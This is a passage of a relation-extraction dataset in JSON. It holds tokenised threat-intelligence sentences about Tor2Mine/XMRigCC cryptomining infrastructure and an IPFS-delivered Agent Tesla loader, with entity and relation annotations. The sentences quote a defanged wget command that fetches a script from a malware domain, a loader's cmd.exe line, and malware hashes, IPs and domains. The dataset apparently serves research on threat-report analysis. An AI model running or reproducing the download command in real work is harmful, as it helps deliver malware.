["According", "to", "the", "blog", ",", "there", "were", "several", "domains", "referenced", "in", "the", "configuration", "for", "an", "XMRigCC", "payload", "during", "these", "campaigns", ",", "including", "eu.minerpool.pw", "and", "rs.fym5gserobhh.pw", ",", "both", "lexically", "similar", "to", "the", "eu1.minerpool.pw", "and", "v1.fym5gserobhh.pw", "domains", "we", "discovered", "in", "our", "recent", "research", "."], ["The", "configuration", "also", "mentioned", "185.10.68.220", ",", "our", "newly", "identified", "Tor2Mine", "IP", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "Shell script file", "pos": [6, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "4d21cab49f7d7dd7d39df72b244a249", "pos": [10, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "file", "pos": [4, 5], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [23, 23], "name": "wget request", "pos": [10, 12], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [26, 26], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [13, 16], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [38, 38], "name": "daa768e8d66aa224491000e891f1ef2cb7c", "pos": [8, 9], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "VirusTotal", "pos": [11, 12], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [47, 47], "name": "wget request", "pos": [17, 19], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [60, 60], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [30, 33], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [73, 73], "name": "195.123.234.33", "pos": [7, 8], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "XMRigCC", "pos": [10, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [94, 94], "name": "File", "pos": [0, 1], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [97, 97], "name": "Tor2Mine", "pos": [3, 4], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [106, 106], "name": "3c2d83b9e9b1b107c3db1185229", "pos": [4, 5], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [110, 110], "name": "URLs", "pos": [8, 9], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [115, 115], "name": "107.181.187.132", "pos": [13, 14], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [120, 120], "name": "hxxp : //107.181.160.197/lin/32/xmrig", "pos": [18, 21], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [143, 143], "name": "domains", "pos": [8, 9], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [150, 150], "name": "XMRigCC payload", "pos": [15, 17], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [154, 154], "name": "campaigns", "pos": [19, 20], "index": "19_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [157, 157], "name": "eu.minerpool.pw", "pos": [22, 23], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [159, 159], "name": "rs.fym5gserobhh.pw", "pos": [24, 25], "index": "21_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [166, 166], "name": "eu1.minerpool.pw", "pos": [31, 32], "index": "22_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [168, 168], "name": "v1.fym5gserobhh.pw", "pos": [33, 34], "index": "23_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [181, 181], "name": "185.10.68.220", "pos": [4, 5], "index": "24_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "EX", "evidence": [1], "t": 2, "h": 3}, {"r": "ST", "evidence": [1], "h": 3, "t": 4}, {"r": "RF", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1], "t": 2, "h": 3}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "FR", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2], "t": 5, "h": 7}, {"r": "ST", "evidence": [3], "t": 9, "h": 10}, {"r": "RF", "evidence": [3], "t": 9, "h": 10}, {"r": "ST", "evidence": [4, 5], "h": 12, "t": 14}, {"r": "RF", "evidence": [4, 5], "h": 12, "t": 14}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "CO", "evidence": [5], "h": 15, "t": 16}, {"r": "CO", "evidence": [5], "t": 14, "h": 15}, {"r": "UK", "evidence": [4, 5, 6], "t": 11, "h": 19}, {"r": "ST", "evidence": [6], "t": 17, "h": 19}, {"r": "WR", "evidence": [6], "t": 18, "h": 19}, {"r": "WR", "evidence": [6], "t": 18, "h": 19}, {"r": "WR", "evidence": [6], "t": 18, "h": 19}, {"r": "WR", "evidence": [6], "t": 18, "h": 19}, {"r": "CO", "evidence": [6], "h": 20, "t": 23}, {"r": "CO", "evidence": [6], "h": 20, "t": 22}, {"r": "CO", "evidence": [6], "h": 20, "t": 21}, {"r": "CO", "evidence": [6], "t": 17, "h": 20}, {"r": "CO", "evidence": [6, 7], "h": 20, "t": 24}]}, {"title": "087-22", "sents": [["The", "content", "of", "this", "file", "includes", "a", "string", "with", "a", "wget", "request", "to", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "."], ["From", "there", ",", "we", "identified", "a", "file", "(", "daa768e8d66aa224491000e891f1ef2cb7c", ")", "in", "VirusTotal", "whose", "content", "shows", "an", "identical", "wget", "request", "(", "``", "wget", "--", "user-agent", "``", "linux", "''", "-q", "-O", "-", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "''", ")", "."], ["This", "file", "reaches", "out", "to", "the", "aforementioned", "195.123.234.33", ",", "an", "XMRigCC", "IP", "that", "previously", "hosted", "the", "newly", "identified", "domains", ",", "according", "to", "VirusTotal", "and", "Umbrella", ",", "respectively", "."], ["File", "containing", "the", "Tor2Mine", "IP", "and", "domain", "."], ["One", "such", "file", ",", "3c2d83b9e9b1b107c3db1185229", ",", "has", "embedded", "URLs", "that", "are", "hosted", "on", "107.181.187.132", "(", "e.", "g.", ",", "hxxp", ":", "//107.181.160.197/lin/32/xmrig", ")", ",", "which", "we", "previously", "mentioned", "is", "a", "known", "Tor2Mine", "IP", "."], ["According", "to", "the", "blog", ",", "there", "were", "several", "domains", "referenced", "in", "the", "configuration", "for", "an", "XMRigCC", "payload", "during", "these", "campaigns", ",", "including", "eu.minerpool.pw", "and", "rs.fym5gserobhh.pw", ",", "both", "lexically", "similar", "to", "the", "eu1.minerpool.pw", "and", "v1.fym5gserobhh.pw", "domains", "we", "discovered", "in", "our", "recent", "research", "."], ["The", "configuration", "also", "mentioned", "185.10.68.220", ",", "our", "newly", "identified", "Tor2Mine", "IP", "."], ["In", "addition", "to", "these", "similarities", ",", "the", "April", "blog", "also", "mentions", "the", "AZORult", "actors", "downloading", "XMRig", "from", "195.123.234.33", ",", "which", "previously", "hosted", "the", "two", "newly", "identified", "Tor2Mine", "domains", ",", "asq.r77vh0.pw", "and", "asq.d6shiiwz.pw", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "file", "pos": [4, 5], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [10, 10], "name": "wget request", "pos": [10, 12], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [13, 13], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [13, 16], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "daa768e8d66aa224491000e891f1ef2cb7c", "pos": [8, 9], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "VirusTotal", "pos": [11, 12], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [34, 34], "name": "wget request", "pos": [17, 19], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [47, 47], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [30, 33], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [60, 60], "name": "195.123.234.33", "pos": [7, 8], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [63, 63], "name": "XMRigCC", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [81, 81], "name": "File", "pos": [0, 1], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [84, 84], "name": "Tor2Mine", "pos": [3, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [93, 93], "name": "3c2d83b9e9b1b107c3db1185229", "pos": [4, 5], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [97, 97], "name": "URLs", "pos": [8, 9], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [102, 102], "name": "107.181.187.132", "pos": [13, 14], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [107, 107], "name": "hxxp : //107.181.160.197/lin/32/xmrig", "pos": [18, 21], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [130, 130], "name": "domains", "pos": [8, 9], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [137, 137], "name": "XMRigCC payload", "pos": [15, 17], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [141, 141], "name": "campaigns", "pos": [19, 20], "index": "17_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [144, 144], "name": "eu.minerpool.pw", "pos": [22, 23], "index": "18_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [146, 146], "name": "rs.fym5gserobhh.pw", "pos": [24, 25], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [153, 153], "name": "eu1.minerpool.pw", "pos": [31, 32], "index": "20_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [155, 155], "name": "v1.fym5gserobhh.pw", "pos": [33, 34], "index": "21_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [168, 168], "name": "185.10.68.220", "pos": [4, 5], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [189, 189], "name": "actors", "pos": [13, 14], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [191, 191], "name": "XMRig", "pos": [15, 16], "index": "24_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [193, 193], "name": "195.123.234.33", "pos": [17, 18], "index": "25_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [203, 203], "name": "domains", "pos": [27, 28], "index": "26_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [205, 205], "name": "asq.r77vh0.pw", "pos": [29, 30], "index": "27_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [207, 207], "name": "asq.d6shiiwz.pw", "pos": [31, 32], "index": "28_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 5}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 6}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "t": 3, "h": 5}, {"r": "ST", "evidence": [2], "t": 7, "h": 8}, {"r": "RF", "evidence": [2], "t": 7, "h": 8}, {"r": "ST", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "RF", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 11}, {"r": "CO", "evidence": [4], "h": 13, "t": 14}, {"r": "CO", "evidence": [4], "t": 12, "h": 13}, {"r": "UK", "evidence": [3, 4, 5], "t": 9, "h": 17}, {"r": "ST", "evidence": [5], "t": 15, "h": 17}, {"r": "WR", "evidence": [5], "t": 16, "h": 17}, {"r": "WR", "evidence": [5], "t": 16, "h": 17}, {"r": "WR", "evidence": [5], "t": 16, "h": 17}, {"r": "WR", "evidence": [5], "t": 16, "h": 17}, {"r": "CO", "evidence": [5], "h": 18, "t": 21}, {"r": "CO", "evidence": [5], "h": 18, "t": 20}, {"r": "CO", "evidence": [5], "h": 18, "t": 19}, {"r": "CO", "evidence": [5], "t": 15, "h": 18}, {"r": "CO", "evidence": [5, 6], "h": 18, "t": 22}, {"r": "CO", "evidence": [5, 6, 7], "h": 17, "t": 23}, {"r": "WR", "evidence": [7], "h": 23, "t": 24}, {"r": "ST", "evidence": [7], "h": 23, "t": 25}, {"r": "RF", "evidence": [7], "h": 23, "t": 25}, {"r": "CO", "evidence": [7], "h": 25, "t": 27}, {"r": "CO", "evidence": [7], "h": 25, "t": 26}, {"r": "CO", "evidence": [7], "h": 25, "t": 28}]}, {"title": "002-0", "sents": [["The", "email", "attachment", "is", "a", "ZIP", "file", "that", "contains", "a", "PE32", "executable", "."], ["This", "executable", ",", "written", "in", ".NET", ",", "works", "as", "a", "downloader", "to", "retrieve", "the", "next", "stage", "of", "the", "malware", "infection", "chain", "."], ["Once", "executed", ",", "the", "downloader", "connects", "to", "an", "IPFS", "gateway", "to", "obtain", "a", "blob", "of", "data", "that", "has", "been", "hosted", "on", "the", "IPFS", "network", "."], ["The", "data", "consists", "of", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "payload", "."], ["The", "downloader", "stores", "each", "byte", "of", "this", "data", "retrieved", "from", "the", "IPFS", "gateway", "in", "an", "array", "and", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "new", "payload", "is", "reflectively", "loaded", "and", "executed", ",", "initiating", "the", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "served", "as", "a", "loader", "and", "operated", "similarly", ",", "but", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "for", "each", "cluster", "."], ["Most", "loaders", "were", "not", "packed", ",", "but", "some", "samples", "were", "observed", "to", "be", "packed", "using", "UPX", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "email", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "PE32 executable", "pos": [10, 12], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [14, 14], "name": "executable", "pos": [1, 2], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [39, 39], "name": "downloader", "pos": [4, 5], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [43, 43], "name": "IPFS gateway", "pos": [8, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "data", "pos": [15, 16], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [61, 61], "name": "data", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [66, 66], "name": "PE32 executable", "pos": [6, 8], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [76, 76], "name": "downloader", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [82, 82], "name": "data", "pos": [7, 8], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [86, 86], "name": "IPFS gateway", "pos": [11, 13], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [99, 99], "name": "executable", "pos": [24, 25], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [108, 108], "name": "PE32", "pos": [33, 34], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [112, 112], "name": "payload", "pos": [2, 3], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [121, 121], "name": "remote access trojan", "pos": [11, 14], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [125, 125], "name": "RAT", "pos": [15, 16], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [128, 128], "name": "Agent Tesla", "pos": [18, 20], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [137, 137], "name": "initial payload", "pos": [6, 8], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [149, 149], "name": "final payload", "pos": [18, 20], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [154, 154], "name": "IPFS network", "pos": [23, 25], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [163, 163], "name": "loaders", "pos": [1, 2], "index": "20_0"}]], "labels": [{"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 11}, {"r": "ST", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "RF", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "EX", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "ST", "evidence": [2], "h": 3, "t": 4}, {"r": "RF", "evidence": [2], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "CO", "evidence": [2, 3, 4], "h": 5, "t": 9}, {"r": "CO", "evidence": [2, 3, 4], "h": 4, "t": 10}, {"r": "CO", "evidence": [2, 3, 4], "h": 3, "t": 8}, {"r": "RD", "evidence": [4], "h": 8, "t": 9}, {"r": "ST", "evidence": [4], "h": 8, "t": 10}, {"r": "RF", "evidence": [4], "h": 8, "t": 10}, {"r": "WR", "evidence": [4], "h": 8, "t": 12}, {"r": "CO", "evidence": [4, 5], "h": 12, "t": 13}, {"r": "CO", "evidence": [5], "h": 14, "t": 15}, {"r": "CO", "evidence": [5], "h": 14, "t": 16}, {"r": "RD", "evidence": [4, 5, 6], "t": 12, "h": 17}, {"r": "ST", "evidence": [6], "h": 17, "t": 19}, {"r": "RF", "evidence": [6], "h": 17, "t": 19}, {"r": "RD", "evidence": [4, 5, 6], "t": 12, "h": 18}, {"r": "ST", "evidence": [6], "h": 18, "t": 19}, {"r": "RF", "evidence": [6], "h": 18, "t": 19}, {"r": "ST", "evidence": [6], "h": 18, "t": 19}, {"r": "RF", "evidence": [6], "h": 18, "t": 19}, {"r": "ST", "evidence": [6, 7], "t": 19, "h": 20}, {"r": "RF", "evidence": [6, 7], "t": 19, "h": 20}, {"r": "ST", "evidence": [6, 7], "t": 19, "h": 20}, {"r": "RF", "evidence": [6, 7], "t": 19, "h": 20}]}, {"title": "002-1", "sents": [["This", "executable", ",", "written", "in", ".NET", ",", "works", "as", "a", "downloader", "to", "retrieve", "the", "next", "stage", "of", "the", "malware", "infection", "chain", "."], ["Once", "executed", ",", "the", "downloader", "connects", "to", "an", "IPFS", "gateway", "to", "obtain", "a", "blob", "of", "data", "that", "has", "been", "hosted", "on", "the", "IPFS", "network", "."], ["The", "data", "consists", "of", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "payload", "."], ["The", "downloader", "stores", "each", "byte", "of", "this", "data", "retrieved", "from", "the", "IPFS", "gateway", "in", "an", "array", "and", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "new", "payload", "is", "reflectively", "loaded", "and", "executed", ",", "initiating", "the", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "served", "as", "a", "loader", "and", "operated", "similarly", ",", "but", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "for", "each", "cluster", "."], ["Most", "loaders", "were", "not", "packed", ",", "but", "some", "samples", "were", "observed", "to", "be", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", ",", "using", "a", "command", "line", "syntax", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "Network", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "executable", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "downloader", "pos": [4, 5], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [30, 30], "name": "IPFS gateway", "pos": [8, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "data", "pos": [15, 16], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "data", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "PE32 executable", "pos": [6, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [63, 63], "name": "downloader", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "data", "pos": [7, 8], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [73, 73], "name": "IPFS gateway", "pos": [11, 13], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [86, 86], "name": "executable", "pos": [24, 25], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [95, 95], "name": "PE32", "pos": [33, 34], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [99, 99], "name": "payload", "pos": [2, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [108, 108], "name": "remote access trojan", "pos": [11, 14], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [112, 112], "name": "RAT", "pos": [15, 16], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [115, 115], "name": "Agent Tesla", "pos": [18, 20], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [124, 124], "name": "initial payload", "pos": [6, 8], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [136, 136], "name": "final payload", "pos": [18, 20], "index": "16_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [141, 141], "name": "IPFS network", "pos": [23, 25], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [150, 150], "name": "loaders", "pos": [1, 2], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [170, 170], "name": "loader", "pos": [4, 5], "index": "19_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [177, 177], "name": "% APPDATA %", "pos": [11, 14], "index": "20_0"}]], "labels": [{"r": "EX", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "ST", "evidence": [1], "h": 1, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 7}, {"r": "CO", "evidence": [1, 2, 3], "h": 2, "t": 8}, {"r": "CO", "evidence": [1, 2, 3], "h": 1, "t": 6}, {"r": "RD", "evidence": [3], "h": 6, "t": 7}, {"r": "ST", "evidence": [3], "h": 6, "t": 8}, {"r": "RF", "evidence": [3], "h": 6, "t": 8}, {"r": "WR", "evidence": [3], "h": 6, "t": 10}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 11}, {"r": "CO", "evidence": [4], "h": 12, "t": 13}, {"r": "CO", "evidence": [4], "h": 12, "t": 14}, {"r": "RD", "evidence": [3, 4, 5], "t": 10, "h": 15}, {"r": "ST", "evidence": [5], "h": 15, "t": 17}, {"r": "RF", "evidence": [5], "h": 15, "t": 17}, {"r": "RD", "evidence": [3, 4, 5], "t": 10, "h": 16}, {"r": "ST", "evidence": [5], "h": 16, "t": 17}, {"r": "RF", "evidence": [5], "h": 16, "t": 17}, {"r": "ST", "evidence": [5], "h": 16, "t": 17}, {"r": "RF", "evidence": [5], "h": 16, "t": 17}, {"r": "ST", "evidence": [5, 6], "t": 17, "h": 18}, {"r": "RF", "evidence": [5, 6], "t": 17, "h": 18}, {"r": "ST", "evidence": [5, 6], "t": 17, "h": 18}, {"r": "RF", "evidence": [5, 6], "t": 17, "h": 18}, {"r": "RD", "evidence": [6, 7], "h": 18, "t": 20}, {"r": "RD", "evidence": [6, 7], "h": 18, "t": 20}, {"r": "WR", "evidence": [6, 7], "h": 18, "t": 20}, {"r": "CO", "evidence": [6, 7], "h": 18, "t": 19}, {"r": "RD", "evidence": [7], "h": 19, "t": 20}, {"r": "WR", "evidence": [7], "h": 19, "t": 20}]}, {"title": "002-2", "sents": [["Once", "executed", ",", "the", "downloader", "connects", "to", "an", "IPFS", "gateway", "to", "obtain", "a", "blob", "of", "data", "that", "has", "been", "hosted", "on", "the", "IPFS", "network", "."], ["The", "data", "consists", "of", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "payload", "."], ["The", "downloader", "stores", "each", "byte", "of", "this", "data", "retrieved", "from", "the", "IPFS", "gateway", "in", "an", "array", "and", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "new", "payload", "is", "reflectively", "loaded", "and", "executed", ",", "initiating", "the", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "served", "as", "a", "loader", "and", "operated", "similarly", ",", "but", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "for", "each", "cluster", "."], ["Most", "loaders", "were", "not", "packed", ",", "but", "some", "samples", "were", "observed", "to", "be", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", ",", "using", "a", "command", "line", "syntax", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "Network", "."], ["The", "malware", "then", "attempts", "to", "download", "Python", "3.10", "from", "the", "software", "provider", "using", "the", "cURL", "command", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "downloader", "pos": [4, 5], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [8, 8], "name": "IPFS gateway", "pos": [8, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "data", "pos": [15, 16], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "data", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "PE32 executable", "pos": [6, 8], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "downloader", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": "data", "pos": [7, 8], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [51, 51], "name": "IPFS gateway", "pos": [11, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "executable", "pos": [24, 25], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [73, 73], "name": "PE32", "pos": [33, 34], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [77, 77], "name": "payload", "pos": [2, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [86, 86], "name": "remote access trojan", "pos": [11, 14], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "RAT", "pos": [15, 16], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [93, 93], "name": "Agent Tesla", "pos": [18, 20], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "initial payload", "pos": [6, 8], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [114, 114], "name": "final payload", "pos": [18, 20], "index": "15_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [119, 119], "name": "IPFS network", "pos": [23, 25], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [128, 128], "name": "loaders", "pos": [1, 2], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [148, 148], "name": "loader", "pos": [4, 5], "index": "18_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [155, 155], "name": "% APPDATA %", "pos": [11, 14], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [180, 180], "name": "malware", "pos": [1, 2], "index": "20_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [185, 185], "name": "Python 3.10", "pos": [6, 8], "index": "21_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [189, 189], "name": "software provider", "pos": [10, 12], "index": "22_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 2, "t": 6}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 7}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "RD", "evidence": [2], "h": 5, "t": 6}, {"r": "ST", "evidence": [2], "h": 5, "t": 7}, {"r": "RF", "evidence": [2], "h": 5, "t": 7}, {"r": "WR", "evidence": [2], "h": 5, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 9, "t": 